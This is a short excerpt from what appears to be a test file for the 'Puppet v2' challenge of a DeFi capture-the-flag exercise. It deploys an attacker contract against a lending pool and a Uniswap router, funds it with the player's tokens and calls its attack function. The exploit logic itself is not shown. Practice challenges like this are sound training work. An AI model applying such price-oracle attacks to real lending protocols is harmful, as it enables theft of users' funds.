...
describe('[Challenge] Puppet v2', function () {
    ...
    it('Execution', async function () {
        ...
        const attackerContract = await (await ethers.getContractFactory("AttackPuppetV2", player))
            .deploy(lendingPool.address, uniswapRouter.address, token.address)
        await token.connect(player).transfer(attackerContract.address, PLAYER_INITIAL_TOKEN_BALANCE);
        await attackerContract.attack({ value: PLAYER_INITIAL_ETH_BALANCE - 4n * 10n ** 17n })
